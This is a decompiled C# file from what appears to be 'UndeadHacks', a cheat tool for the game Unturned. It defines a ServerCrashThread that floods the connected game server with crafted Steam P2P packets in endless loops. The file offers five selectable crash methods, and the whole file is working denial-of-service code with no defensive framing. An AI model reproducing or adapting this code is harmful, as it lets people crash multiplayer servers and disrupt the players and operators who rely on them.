using System;
using System.Threading;
using SDG.Unturned;
using Steamworks;

namespace UndeadHacks
{
	// Token: 0x02000096 RID: 150
	public static class ServerCrashThread
	{
		// Token: 0x0600024B RID: 587 RVA: 0x00015B4C File Offset: 0x00013D4C
		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected = (Provider.ClientDisconnected)Delegate.Combine(Provider.onClientDisconnected, new Provider.ClientDisconnected(delegate()
			{
				ServerCrashThread.ServerCrashEnabled = false;
			}));
			byte[] array = new byte[2];
			array[0] = 1;
			byte[] array2 = new byte[2];
			array2[0] = 24;
			byte[] array3 = new byte[2];
			array3[0] = 2;
			byte[] array4 = new byte[2];
			array4[0] = 20;
			(new byte[2])[0] = 21;
			for (;;)
			{
				if (Provider.isConnected)
				{
					if (ServerCrashThread.ServerCrashEnabled)
					{
						switch (MiscOptions.SCrashMethod)
						{
						case 1:
							while (Provider.isConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
							{
								SteamNetworking.SendP2PPacket(Provider.server, array, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
							}
							continue;
						case 2:
							while (Provider.isConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
							{
								SteamNetworking.SendP2PPacket(Provider.server, array2, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
							}
							continue;
						case 3:
							while (Provider.isConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
							{
								SteamNetworking.SendP2PPacket(Provider.server, array3, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
							}
							continue;
						case 4:
							while (Provider.isConnected)
							{
								if (!ServerCrashThread.ServerCrashEnabled && !ServerCrashThread.AlwaysCrash)
								{
									break;
								}
								SteamNetworking.SendP2PPacket(Provider.server, array4, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
							}
							continue;
						case 5:
							while (Provider.isConnected)
							{
								if (!ServerCrashThread.ServerCrashEnabled && !ServerCrashThread.AlwaysCrash)
								{
									break;
								}
								SteamNetworking.SendP2PPacket(Provider.server, array4, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
							}
							continue;
						default:
							continue;
						}
					}
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x04000213 RID: 531
		public static bool ServerCrashEnabled;

		// Token: 0x04000214 RID: 532
		public static bool AlwaysCrash;
	}
}
